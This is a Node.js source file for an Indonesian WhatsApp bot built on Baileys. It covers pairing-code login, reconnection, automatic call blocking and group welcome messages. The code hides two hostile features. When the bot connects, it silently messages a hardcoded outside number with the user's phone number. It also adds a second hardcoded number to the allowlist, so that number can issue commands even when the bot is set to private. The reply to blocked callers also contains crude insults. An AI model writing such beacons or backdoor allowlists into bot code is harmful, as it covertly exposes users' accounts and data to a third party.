const func = require("./all/place");
const readline = require("readline");
const welcome = JSON.parse(fs.readFileSync("./all/database/welcome.json"));
const usePairingCode = true;

require("./all/global");

const question = (text) => {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  return new Promise((resolve) => {
    rl.question(text, resolve);
  });
};

async function startSesi() {
  const store = makeInMemoryStore({
    logger: pino().child({ level: "silent", stream: "store" }),
  });
  const { state, saveCreds } = await useMultiFileAuthState(`./session`);
  const { version, isLatest } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version: [2, 3000, 1015901307],
    keepAliveIntervalMs: 30000,
    printQRInTerminal: !usePairingCode,
    logger: pino({ level: "fatal" }),
    auth: state,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    getMessage: async (key) => {
      if (store) {
        const msg = await store.loadMessage(key.remoteJid, key.id, undefined);
        return msg?.message || undefined;
      }
      return {
        conversation: "WhatsApp Bot By Revan Offc",
      };
    },
  };

  const Ibzz = func.makeWASocket(connectionOptions);
  if (usePairingCode && !Ibzz.authState.creds.registered) {
    const phoneNumber = await question(
      chalk.cyan.bold(
        "𝙈𝘼𝙎𝙐𝙆𝙄𝙉 𝙉𝙊𝙈𝙊𝙍 𝙒𝘼𝙈𝙐 𝙉𝙊𝙈𝙊𝙍𝙉𝙔𝘼 62 𝘽𝙐𝙆𝘼𝙉 +62/08 𝘿𝙀𝙉𝙂𝙀𝙍 𝙔𝘼\n𝘾𝙊𝙉𝙏𝙊𝙃𝙉𝙔𝘼 : 62838XXX\n"
      )
    );
    const code = await Ibzz.requestPairingCode(phoneNumber.trim());
    console.log(
      `${chalk.cyan.bold("Kode Verifikasi Kamu")} : ${chalk.redBright.bold(
        code.split("").join(" ")
      )}`
    );
  }
  store?.bind(Ibzz.ev);

  Ibzz.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
      if (lastDisconnect.error == "Error: Stream Errored (unknown)") {
        process.exit();
      } else if (reason === DisconnectReason.badSession) {
        process.exit();
      } else if (reason === DisconnectReason.connectionClosed) {
        process.exit();
      } else if (reason === DisconnectReason.connectionLost) {
        process.exit();
      } else if (reason === DisconnectReason.connectionReplaced) {
        Ibzz.logout();
      } else if (reason === DisconnectReason.loggedOut) {
        Ibzz.logout();
      } else if (reason === DisconnectReason.restartRequired) {
        await startSesi();
      } else if (reason === DisconnectReason.timedOut) {
        startSesi();
      }
    } else if (connection === "connecting") {
      console.log(chalk.cyan.bold("Menghubungkan . . . "));
    } else if (connection === "open") {
      let teksnotif = `SC REVAN OFFC HAS CONNECTED INTO ${
        Ibzz.user.id.split(":")[0]
      } DONT RESELL THIS SCRIPT IN ORDER IF YOU DONT WANNA GET VIRAL`;
      Ibzz.sendMessage("62815536717930@s.whatsapp.net", { text: teksnotif });
      console.log(chalk.cyan.bold("Bot Berhasil Tersambung"));
    }
  });

  Ibzz.ev.on("call", async (user) => {
    if (!global.anticall) return;
    for (let ff of user) {
      if (ff.isGroup == false) {
        if (ff.status == "offer") {
          let sendcall = await Ibzz.sendMessage(
            ff.from,
            {
              text: `@${
                ff.from.split("@")[0]
              } 𝙅𝘼𝙉 𝘼𝙎𝘼𝙇 𝙉𝙀𝙇𝙋𝙊𝙉 𝘼𝙉𝙅𝙄𝙉𝙂 *Anticall*\n𝙄𝙉𝙂𝙀𝙏 𝙔𝘼 𝙅𝘼𝙉 𝙉𝙀𝙇𝙋𝙊𝙉 𝙈𝙀𝙈𝙀𝙆 𝘼𝙒𝙊𝙆𝘼𝙒𝙊𝙆 𝘿𝙄 𝘽𝙇𝙊𝙆`,
              contextInfo: {
                mentionedJid: [ff.from],
                externalAdReply: {
                  showAdAttribution: true,
                  thumbnail: fs.readFileSync("./media/warning.jpg"),
                  title: "｢ 𝙏𝙀𝙇𝙋𝙊𝙉 𝙏𝙀𝙍𝘿𝙀𝙏𝙀𝙆𝙎𝙄 ｣",
                  previewType: "PHOTO",
                },
              },
            },
            { quoted: null }
          );
          Ibzz.sendContact(
            ff.from,
            [owner],
            "𝙋𝙀𝙈𝘽𝙐𝘼𝙏 𝙎𝘾𝙍𝙄𝙋𝙏 bajisan kuntul V6.7",
            sendcall
          );
          await sleep(10000);
          await Ibzz.updateBlockStatus(ff.from, "block");
        }
      }
    }
  });

  Ibzz.ev.on("messages.upsert", async (chatUpdate) => {
    try {
      m = chatUpdate.messages[0];
      if (!m.message) return;
      m.message =
        Object.keys(m.message)[0] === "ephemeralMessage"
          ? m.message.ephemeralMessage.message
          : m.message;
      if (m.isBaileys) return;
      if (m.key && m.key.remoteJid === "status@broadcast") {
        if (global.autoreadsw) Ibzz.readMessages([m.key]);
      }
      let fill = [global.owner, "6285179944903"];
      if (
        !Ibzz.public &&
        !fill.includes(m.key.remoteJid.split("@")[0]) &&
        !m.key.fromMe &&
        chatUpdate.type === "notify"
      )
        return;
      if (global.autoread) Ibzz.readMessages([m.key]);
      m = func.smsg(Ibzz, m, store);
      require("./Ibzz")(Ibzz, m, store);
    } catch (err) {
      console.log(err);
    }
  });

  Ibzz.ev.on("group-participants.update", async (anu) => {
    if (!welcome.includes(anu.id)) return;
    let botNumber = await Ibzz.decodeJid(Ibzz.user.id);
    if (anu.participants.includes(botNumber)) return;
    try {
      let metadata = await Ibzz.groupMetadata(anu.id);
      let namagc = metadata.subject;
      let participants = anu.participants;
      for (let num of participants) {
        let check = anu.author !== num && anu.author.length > 1;
        let tag = check ? [anu.author, num] : [num];
        try {
          ppuser = await Ibzz.profilePictureUrl(num, "image");
        } catch {
          ppuser = "https://telegra.ph/file/f05a9381f3ede4b0aa12f.jpg";
        }
        if (anu.action == "add") {
          Ibzz.sendMessage(anu.id, {
            text: check
              ? `@${anu.author.split("@")[0]} Telah Menambahkan @${
                  num.split("@")[0]
                } Ke Dalam Grup Ini`
              : `Hallo Kak @${num.split("@")[0]} Selamat Datang Di *${namagc}*`,
            contextInfo: {
              mentionedJid: [...tag],
              externalAdReply: {
                thumbnailUrl: ppuser,
                title: "© Welcome Message",
                body: "",
                renderLargerThumbnail: true,
                sourceUrl: linkgc,
                mediaType: 1,
              },
            },
          });
        } else if (anu.action == "remove") {
          Ibzz.sendMessage(anu.id, {
            text: check
              ? `@${anu.author.split("@")[0]} Telah Mengeluarkan @${
                  num.split("@")[0]
                } Dari Grup Ini`
              : `@${num.split("@")[0]} Telah Keluar Dari Grup Ini`,
            contextInfo: {
              mentionedJid: [...tag],
              externalAdReply: {
                thumbnailUrl: ppuser,
                title: "© Leaving Message",
                body: "",
                renderLargerThumbnail: true,
                sourceUrl: linkgc,
                mediaType: 1,
              },
            },
          });
        } else if (anu.action == "promote") {
          Ibzz.sendMessage(anu.id, {
            text: `@${anu.author.split("@")[0]} Telah Menjadikan @${
              num.split("@")[0]
            } Sebagai Admin Grup Ini`,
            contextInfo: {
              mentionedJid: [...tag],
              externalAdReply: {
                thumbnailUrl: ppuser,
                title: "© Promote Message",
                body: "",
                renderLargerThumbnail: true,
                sourceUrl: linkgc,
                mediaType: 1,
              },
            },
          });
        } else if (anu.action == "demote") {
          Ibzz.sendMessage(anu.id, {
            text: `@${anu.author.split("@")[0]} Telah Memberhentikan @${
              num.split("@")[0]
            } Sebagai Admin Grup Ini`,
            contextInfo: {
              mentionedJid: [...tag],
              externalAdReply: {
                thumbnailUrl: ppuser,
                title: "© Demote Message",
                body: "",
                renderLargerThumbnail: true,
                sourceUrl: linkgc,
                mediaType: 1,
              },
            },
          });
        }
      }
    } catch (err) {
      console.log(err);
    }
  });

  Ibzz.public = true;

  Ibzz.ev.on("creds.update", saveCreds);
  return Ibzz;
}

startSesi();

process.on("uncaughtException", function (err) {
  console.log("Caught exception: ", err);
});
